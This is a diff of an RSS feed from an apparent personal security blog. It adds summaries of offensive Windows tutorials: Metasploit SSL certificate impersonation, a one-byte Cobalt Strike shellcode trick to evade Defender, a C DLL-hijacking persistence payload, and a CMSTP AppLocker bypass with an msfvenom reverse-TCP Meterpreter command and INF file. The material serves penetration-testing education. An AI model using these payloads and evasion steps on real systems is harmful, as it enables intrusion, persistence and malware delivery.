@@ -13,12 +13,136 @@
     <language>en</language>
     <managingEditor>thiklife403@gmail.com (Thik)</managingEditor>
     <webMaster>thiklife403@gmail.com (Thik)</webMaster>
-    <copyright><a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'><img alt='Creative Commons License' style='border-width:0;display:block;margin-left:auto;margin-right:auto;' src='https://i.creativecommons.org/l/by-sa/4.0/88x31.png' /></a>©2019 - 2021 All content is licensed under <a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'>CC BY-SA</a>.</copyright>
-    <lastBuildDate>Wed, 04 Aug 2021 02:00:06 +0700</lastBuildDate>
+    <copyright><a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'><img alt='Creative Commons License' style='border-width:0;display:block;margin-left:auto;margin-right:auto;' src='https://i.creativecommons.org/l/by-sa/4.0/88x31.png' /></a>©2019 - 2022 All content is licensed under <a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'>CC BY-SA</a>.</copyright>
+    <lastBuildDate>Mon, 24 Oct 2022 21:01:06 +0700</lastBuildDate>
     
         <atom:link href="https://thiklab.com/en/series/winexe/index.xml" rel="self" type="application/rss+xml" />
     
 
+      
+      <item>
+        <title>Impersonate SSL Meterpreter Bypass</title>
+        <link>https://thiklab.com/en/posts/impersonate-ssl-meterpreter-bypass/</link>
+        <pubDate>Mon, 24 Oct 2022 21:01:06 +0700</pubDate>
+        <author>thiklife403@gmail.com (Thik)</author>
+        <atom:modified>Mon, 24 Oct 2022 21:01:06 +0700</atom:modified>
+        <guid>https://thiklab.com/en/posts/impersonate-ssl-meterpreter-bypass/</guid>
+        <description>Clone SSL Certification By using a module developed by Chris John Riley, we can clone all the SSL certificate files of an authenticated source. The local certificate is created in PEM format. It can be used in all the modules of Metasploit where SSLCert option is given.
+So now, first we will generate the certificate using the module by typing the following commands.
+1 2 3  use auxiliary/gather/impersonate_ssl set rhosts https://example.</description>
+        
+        <dc:creator>thik</dc:creator>
+        <media:content url="https://thiklab.comimages/feature2/article-1.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>metasploit</category>
+            
+          
+            
+              <category>ssl</category>
+            
+          
+            
+              <category>bypass</category>
+            
+          
+            
+              <category>reverseshell</category>
+            
+          
+        
+        
+        
+          
+            
+              <category>WinExE</category>
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>Evading Win Defender With 1 Byte Change</title>
+        <link>https://thiklab.com/en/posts/evading-1-byte-change/</link>
+        <pubDate>Wed, 28 Sep 2022 21:01:06 +0700</pubDate>
+        <author>thiklife403@gmail.com (Thik)</author>
+        <atom:modified>Wed, 28 Sep 2022 21:01:06 +0700</atom:modified>
+        <guid>https://thiklab.com/en/posts/evading-1-byte-change/</guid>
+        <description>1 Byte Evading Let&amp;rsquo;s generate a CobaltStrike c shellcode.
+Note that the first byte of the shellcode is \xfc.
+Let&amp;rsquo;s put the shellcode we got into the launcher, but with a small twist.
+Change \xfc to any other byte value. I choose \xfdStore the correct first byte \xfc in a char variableBefore copying the full shellcode to the newly allocated memory, flip the bad byte \xfd with a good one \xfcBuild the executableBelow is the source code if you want to test it in your environment.</description>
+        
+        <dc:creator>thik</dc:creator>
+        <media:content url="https://thiklab.comimages/feature2/article-1.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>cobaltstrike</category>
+            
+          
+            
+              <category>reverseshell</category>
+            
+          
+            
+              <category>c-shellcode</category>
+            
+          
+        
+        
+        
+          
+            
+              <category>WinExE</category>
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>DLL Hijacking - Persistence Method</title>
+        <link>https://thiklab.com/en/posts/dll-hijacking-persistence-method/</link>
+        <pubDate>Mon, 19 Sep 2022 21:01:06 +0700</pubDate>
+        <author>thiklife403@gmail.com (Thik)</author>
+        <atom:modified>Mon, 19 Sep 2022 21:01:06 +0700</atom:modified>
+        <guid>https://thiklab.com/en/posts/dll-hijacking-persistence-method/</guid>
+        <description>C - Execute Command Prompt 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  #include &amp;lt;windows.h&amp;gt;using namespace std; void exec() { WinExec(&amp;#34;cmd.exe /c c:\\programdata\\putty.exe&amp;#34;, 0); } BOOL WINAPI DllMain (HANDLE hDLL, DWORD dwReason, LYVOID lpReserved) { switch (dwReason) { case DLL_PROCESS_ATTACH: exec(); break; } return TRUE; }   DLL Build In terminal type below command.
+1 2 3 4 5 6 7 8  // To create Windows executables, you need to instsall mingw cross-compiler sudo apt-get install mingw-w64 //For x64 compile with: x86_64-w64-mingw32-gcc r4t.</description>
+        
+        <dc:creator>thik</dc:creator>
+        <media:content url="https://thiklab.comimages/feature2/article-1.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>dll</category>
+            
+          
+            
+              <category>reverseshell</category>
+            
+          
+            
+              <category>persistence</category>
+            
+          
+        
+        
+        
+          
+            
+              <category>WinExE</category>
+            
+          
+        
+      </item>
       
       <item>
         <title>AppLocker Bypass - CMSTP</title>
@@ -31,7 +155,7 @@
 1 2  C:\Windows\System32\cmstp.exe C:\Windows\SysWOW64\cmstp.exe   វីធីសាស្ត្រមួយនេះត្រូវបានរកឃើញដោយលោក Oddvar Moe អាចអានលំអិតនៅក្នុង blog របស់គាត់។
 DLL Metasploit ត្រូវបានប្រើប្រាស់ដើម្បីបង្កើតឯកសារមេរោគ DLL តាមរយៈ MSFvenom ។
 1  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.200.55 LPORT=4444 -f dll &amp;gt; idm.dll   សម្រាប់ផ្នែក RegisterOCXSection តម្រូវឲ្យដាក់ទីតាំងរបស់ឯកសារ DLL ដែល​បាន​បង្កើត​រួច។
-1 2 3 4 5 6 7 8 9 10 11 12 13 14  [version] Signature=$chicago$ AdvancedINF=2.5 [DefaultInstall_SingleUser] RegisterOCXs=RegisterOCXSection [RegisterOCXSection] C:\Users\Victim\idm.dll  [Strings] AppAct = &amp;#34;SOFTWARE\Microsoft\Connection Manager&amp;#34; ServiceName=&amp;#34;idm&amp;#34; ShortSvcName=&amp;#34;idm&amp;#34;   រក្សាទុកជា &amp;ldquo;idm-service.</description>
+1 2 3 4 5 6 7 8 9 10 11 12 13 14  [version] Signature=$chicago$ AdvancedINF=2.5 [DefaultInstall_SingleUser] RegisterOCXs=RegisterOCXSection [RegisterOCXSection] C:\Users\Victim\idm.dll [Strings] AppAct = &amp;#34;SOFTWARE\Microsoft\Connection Manager&amp;#34; ServiceName=&amp;#34;idm&amp;#34; ShortSvcName=&amp;#34;idm&amp;#34;   រក្សាទុកជា &amp;ldquo;idm-service.</description>
         
         <dc:creator>thik</dc:creator>
         <media:content url="https://thiklab.comimages/feature3/code-file.png" medium="image"><media:title type="html">featured image</media:title></media:content>
